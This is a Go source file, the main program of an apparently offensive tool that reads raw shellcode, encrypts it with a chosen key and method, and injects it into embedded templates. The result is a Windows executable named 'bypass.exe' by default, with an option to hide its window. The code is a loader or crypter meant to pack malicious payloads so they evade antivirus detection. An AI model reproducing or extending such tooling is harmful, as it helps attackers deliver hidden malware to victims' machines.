package main

import (
	"MateuszEx/config"
	"MateuszEx/core"
	"embed"
	_ "embed"
	"flag"
	"fmt"
	"gopkg.in/yaml.v2"
	"os"
	"path/filepath"
)

//go:embed static
var FS embed.FS

//go:embed template.yaml
var template []byte

var (
	out string
	list bool
	key string
	bin string
	enc string
	tpl int
	hidden bool
)
func init(){
	var conf config.TEMPLATE_NT_YAML
	err := yaml.Unmarshal(template,&conf)
	if err != nil {
		fmt.Println(fmt.Sprintf("Unmarshal: %v",err))
	}
	config.TEMPLATE_STATIC_DATA = conf
	flag.BoolVar(&list,"l",false,"[列出全部模板]")
	flag.StringVar(&key,"k","","[shellcode加密密钥]")
	flag.StringVar(&bin,"b","","[raw格式的shellcode路径]")
	flag.StringVar(&enc,"e","b","[shellcode的加密方式，支持a,b,c,d]")
	flag.IntVar(&tpl,"t",0,"[生成可执行程序所用模板序号]")
	flag.StringVar(&out,"o","bypass.exe","[生成可执行程序名称]")
	flag.BoolVar(&hidden,"h",false,"[可执行程序是否隐藏窗口]")

	//flag.StringVar()
	flag.Parse()
}

func main(){
	core.Banner()
	if list == true{
		core.Usage()
	}else if bin != ""{
			path := core.ReturnKeyRoot(enc)
			if path != "" {
				raw, err := core.ReadBin(bin)
				if err != nil {
					fmt.Println(fmt.Sprintf("[-] The %s bin file is unavailable",bin))
					return
				}
				fmt.Println(fmt.Sprintf("[+] Open %s file is success,length is %d bytes",bin,len(raw)))
				shellcode := core.EncryptoCode(enc,raw,key)
				if shellcode == ""{
					return
				}
				fmt.Println(fmt.Sprintf("[+] Encrypted shellcode done, length is %d byte",len(shellcode)))
				keypath := core.ReturnKeyRoot(enc)
				if keypath == "" {
					fmt.Println("[-] key method is not found")
					return
				}
				core.Inject(tpl,config.SHELLCODE_DATA{Shellcode: shellcode,Key: key},FS,keypath,out,hidden)
			}
	}else{
	//core.Usage()
		_, fileName := filepath.Split(os.Args[0])
		fmt.Println("")
		//fmt.Println("[-] You need to combine the parameters")
		fmt.Println(fmt.Sprintf("[*] example: %s -k ABABCDABCDABCDAB -b payload.bin -e a -t 1 -o 1.exe",fileName))
		fmt.Println("[*] 生成密钥为ABABCDABCDABCDAB,加密方式为a-(aes)加密,模板1的可执行程序")
	}



	//core.InjectGo(1,config.SHELLCODE_DATA{Shellcode: "0x1230x1234"},FS,"static/decryption/aes.txt")
}
